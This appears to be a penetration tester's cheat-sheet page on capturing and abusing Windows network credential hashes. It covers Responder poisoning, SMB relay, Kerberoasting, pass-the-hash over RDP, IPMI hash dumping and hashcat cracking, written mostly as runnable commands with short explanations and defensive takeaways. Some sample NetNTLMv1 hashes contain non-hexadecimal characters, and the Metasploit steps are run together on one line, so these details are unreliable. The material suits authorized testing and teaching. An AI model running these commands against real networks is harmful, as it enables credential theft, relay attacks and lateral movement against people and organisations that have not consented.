# Network Hash Processing Examples

These examples demonstrate how **network-derived hashed credentials** may be collected and processed during **authorized security assessments, audits, or incident investigations**. All techniques described here **must only be performed with explicit permission** and within the defined scope of an approved engagement.

---

## Responder (LLMNR / NBT-NS / mDNS Poisoning)

Responder is a network poisoning tool that listens for name resolution requests and responds in ways that can elicit **NetNTLMv1 or NetNTLMv2 authentication attempts** from Windows systems.

Responder commonly listens on:

- **UDP**: 53, 137, 138, 389, 1434
    
- **TCP**: 21, 25, 80, 110, 139, 389, 445, 587, 1433, 3128, 3141
    
- **Multicast UDP**: 5553
    

### Launch Responder

`python Responder.py -I <interface>`

### Example Captured Hashes

**NetNTLMv1 (SSP Enabled):**

`hashcat::admin-SAA37877:85DSBC2CE95161CD00000000000000000000000000000000:892F905962F76D323837F613F88DE27C2BBD6C9ABCD021D0:11223344556677BB`

**NetNTLMv1 (No SSP):**

`hashcat::admin-SAA37877:76365E2D14285612980C67D057EB9EFEEESEF6EB6FF6E04D:727B4E35F947129EA5289CDEDAE869348823EF89F50FC595:1122334455667788`

**NetNTLMv2:**

`admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:...`

### Reducing Noise and Scope

Responder can be tuned to minimize network disruption:

- **Target specific hosts or IP ranges**
    
- **Respond only to specific names**
    
- **Run in analysis mode** to observe traffic without poisoning
    

`python Responder.py -I <interface> -A`

Responder configuration options are controlled via `Responder.conf`.

---

## SMB Relay with MultiRelay

Captured NetNTLM hashes can sometimes be **relayed** directly to other systems instead of cracked, enabling immediate access if protections are misconfigured.

### Preconditions

- SMB signing **must be disabled** on the target
    
- Captured account must have **local admin** rights on the relay target
    

### Workflow Overview

1. Disable SMB and HTTP servers in `Responder.conf`
    
2. Identify relayable hosts
    
3. Capture authentication attempts
    
4. Relay credentials to a vulnerable target
    

### Check SMB Signing

`python RunFinger.py -i 10.X.X.0/24`

### Start Responder

`python Responder.py -I <interface>`

### Launch MultiRelay

`python MultiRelay.py -t <Target_IP> -u ALL`

This technique demonstrates how **authentication exposure alone** can be sufficient to create an attack path without cracking a password.

---

## Kerberoasting

### Scenario

After gaining a foothold in an Active Directory environment, attackers can request Kerberos service tickets for accounts associated with Service Principal Names (SPNs).

These tickets are encrypted using the service account’s password-derived key and can be cracked offline.

### Enumerate SPNs

`kerberoast.py ldap spn domain/user:password@DC_IP -o spn_enum.txt`

### Request Tickets

`kerberoast.py spnroast domain/user:password@DC_IP -o kirbi_tix.txt`

### Crack Tickets

`hashcat -a 0 -m 13100 kirbi_tix.txt dict.txt`

Kerberoasting is a **classic example of identity-based attack paths**, where service account hygiene directly affects domain-wide security.

---

## Pass-the-Hash (RDP)

### XFreeRDP

`xfreerdp /u:username /d:domain /pth:<NTLM_HASH> /v:<IP>`

### Mimikatz (Restricted Admin Mode)

`sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:"mstsc.exe /restrictedadmin"`

Pass-the-Hash illustrates how **hash exposure bypasses password strength entirely**, enabling lateral movement when administrative boundaries are weak.

---

## IPMI Hash Extraction

### Scenario

IPMI version 2.0 devices often expose password hashes over UDP port 623.

### Metasploit Workflow

`use auxiliary/scanner/ipmi/ipmi_dumphashes set RHOSTS <Target_IP> run`

### Crack Extracted Hashes

`hashcat -a 0 -m 7300 hash.txt dict.txt`

This demonstrates how **non-domain infrastructure credentials** can introduce high-impact attack paths when reused or weakly protected.

---

## Thinking in terms of Attack Paths

From an attack path perspective, every technique on this page contributes to one or more of the following edges:

- **Credential Exposure → Authentication Capability**
    
- **Authentication Capability → Lateral Movement**
    
- **Lateral Movement → Privilege Escalation**
    
- **Privilege Escalation → Domain Impact**
    

Network hash capture is rarely the end goal.  
It is a **graph expansion mechanism**, each leaked hash increases the number of reachable nodes in the environment.

Weak controls around name resolution, service accounts, SMB signing, or legacy authentication protocols often form **low-effort, high-impact paths** that BloodHound-style analysis is designed to surface and prioritize.

---

## Key Takeaways

- Network hash exposure is a **design failure**, not a user failure
- Hashes function as **credentials**, not secrets
- Attackers optimize for **reuse, relay, and chaining**
- The weakest authentication surface defines overall security
- Effective defense requires **path reduction**, not just stronger passwords

---

## References

Responder: [https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)

Kerberoasting: [https://room362.com/post/2016/kerberoast-ptl/](https://room362.com/post/2016/kerberoast-ptl/)

NetNTLM research: [https://www.securify.nl/blog](https://www.securify.nl/blog)

SMB relay analysis: [https://pentestlab.blog](https://pentestlab.blog)

#sudad #ntlm #tools 

[[Processing]]
[[Home]]

